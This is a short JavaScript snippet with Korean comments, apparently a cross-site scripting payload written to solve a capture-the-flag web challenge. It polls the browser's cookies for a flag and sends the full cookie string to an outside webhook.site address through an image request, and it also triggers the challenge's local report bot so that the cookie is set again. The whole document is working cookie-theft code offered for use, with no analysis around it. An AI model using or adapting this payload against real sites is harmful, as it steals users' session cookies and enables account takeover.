let done = false;

// 1. 0.1초마다 쿠키에 FLAG가 생기는지 감시하고, 생기면 즉시 빼돌림
setInterval(() => {
    if (!done && document.cookie.includes('FLAG')) {
        done = true;
        new Image().src = 'https://webhook.site/77545fde-c912-443e-b3a1-1b4677a7dcc0/?flag=' + document.cookie;
    }
}, 100);

// 2. 봇(로컬호스트 8000번 포트)을 스스로 찔러서 쿠키를 다시 굽게 만듦
fetch('http://127.0.0.1:8000/report?url=http://temp.com', {mode: 'no-cors'});
